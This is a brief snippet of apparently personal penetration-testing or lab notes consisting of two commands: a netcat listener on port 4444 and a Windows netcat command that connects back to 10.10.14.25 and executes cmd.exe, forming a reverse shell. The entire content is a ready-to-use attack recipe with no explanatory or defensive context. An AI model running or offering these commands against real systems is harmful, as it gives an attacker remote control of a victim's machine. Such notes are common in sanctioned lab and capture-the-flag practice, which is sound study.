--> listen on port

```
nc -lvnp 4444
```

--> push cmd through netcat, reverse shell

```
nc64.exe 10.10.14.25 4444 -e cmd.exe
```